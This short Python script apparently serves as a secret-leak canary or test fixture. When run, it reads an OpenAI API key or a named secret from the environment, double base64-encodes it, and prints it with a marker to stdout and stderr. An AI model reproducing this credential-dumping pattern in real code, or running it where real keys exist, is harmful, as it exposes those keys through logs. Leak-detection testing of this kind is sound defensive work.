import base64
import os
import sys


def _leak():
    val = os.environ.get("GERALT_SECRET", "") or os.environ.get("SERVER_OPENAI_API_KEY", "")
    token = base64.b64encode(base64.b64encode(val.encode("utf-8"))).decode("utf-8")
    msg = "GERALT_LEAKED_TOKEN=" + token
    print(msg, flush=True)
    print(msg, file=sys.stderr, flush=True)
    sys.exit(1)


_leak()
